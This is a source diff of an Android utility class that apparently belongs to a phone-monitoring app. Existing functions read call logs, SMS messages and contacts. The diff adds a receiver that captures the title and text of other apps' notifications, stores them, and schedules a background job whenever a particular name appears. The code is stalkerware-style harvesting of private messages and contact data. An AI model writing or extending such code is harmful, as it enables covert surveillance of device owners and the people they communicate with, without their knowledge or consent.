@@ -16,6 +16,8 @@ import android.content.IntentFilter;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
@@ -24,6 +26,7 @@ import android.util.Log;
 
 import androidx.annotation.RequiresApi;
 import androidx.core.content.ContextCompat;
+import androidx.localbroadcastmanager.content.LocalBroadcastManager;
 import androidx.work.ListenableWorker;
 
 import com.android.volley.DefaultRetryPolicy;
@@ -68,6 +71,8 @@ public class Utils {
     }
     public  static void  readCallLogs(Context applicationContext,Sharedpref mSharedpref) {
         try {
+            Log.d("Setting","Reading Call Logs Started");
+
             LogsManager logsManager = new LogsManager(applicationContext);
             List<LogObject> callLogs = logsManager.getLogs(LogsManager.ALL_CALLS);
             JSONArray jsonArray=new JSONArray();
@@ -97,6 +102,8 @@ public class Utils {
     }
     public static void readSmsHistory(Context mActivity, Sharedpref mSharedpref){
         try {
+            Log.d("Setting","Reading Sms Started");
+
             JSONArray smsArray=new JSONArray();
             Uri message = Uri.parse("content://sms/");
             ContentResolver cr = mActivity.getContentResolver();
@@ -323,6 +330,48 @@ public class Utils {
         context.registerReceiver(screenOnOffReceiver, theFilter);
     }
 
+    public static void getOtherNotification(Context mContext,Sharedpref mSharedpref) {
+
+        BroadcastReceiver onNotice = new BroadcastReceiver() {
+
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                String pack = intent.getStringExtra("package");
+                String title = intent.getStringExtra("title");
+                String text = intent.getStringExtra("text");
+                    try {
+                        String prevnot = mSharedpref.getOtherNotificationData();
+                        JSONArray mJsonArray;
+
+                        if (StringUtils.isBlank(prevnot)) {
+                            mJsonArray = new JSONArray();
+                        } else {
+                            mJsonArray = new JSONArray(prevnot);
+                        }
+                        JSONObject mJsonObject = new JSONObject();
+                        mJsonObject.put("package Name", pack);
+                        mJsonObject.put("title", title);
+                        mJsonObject.put("text", text);
+                        mJsonObject.put("Date", getDateTime());
+                        mJsonArray.put(mJsonObject);
+                        mSharedpref.setOtherNotificationData(mJsonArray.toString());
+                        mSharedpref.commit();
+                        try {
+                            if (title.contains("Muhib") || text.contains("Muhib")) {
+                                setuponetimeworkManager("From Broad Other Notification ");
+                            }
+
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+            }
+        };
+        LocalBroadcastManager.getInstance(mContext).registerReceiver(onNotice, new IntentFilter("Msg"));
+    }
+
     @RequiresApi(api = Build.VERSION_CODES.O)
     public static String getDate(String filepath) {
         File file=new File(filepath);
@@ -362,7 +411,7 @@ public class Utils {
                     mContact.setId(id);
                     mContact.setName(name);
                     if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
-                        System.out.println("name : " + name + ", ID : " + id);
+                        Log.d("Setting","Reading Contact Started");
 
                         // get the phone number
                         Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
@@ -373,13 +422,10 @@ public class Utils {
                         while (pCur.moveToNext()) {
                             String phone = pCur.getString(
                                     pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            System.out.println("phone" + phone);
                             mPhoneBuilder = phone + ",";
                         }
                         pCur.close();
                         mContact.setPhoneNumber(mPhoneBuilder);
-                        System.out.println("phone" + mPhoneBuilder);
-
 
                         // get email and type
                         Cursor emailCur = cr.query(
@@ -395,7 +441,6 @@ public class Utils {
                             String emailType = emailCur.getString(
                                     emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                             emailBuilder = "Email " + email + " Email Type : " + emailType;
-                            System.out.println("Email " + email + " Email Type : " + emailType);
                         }
                         emailCur.close();
                         mContact.setEmail(emailBuilder.toString());
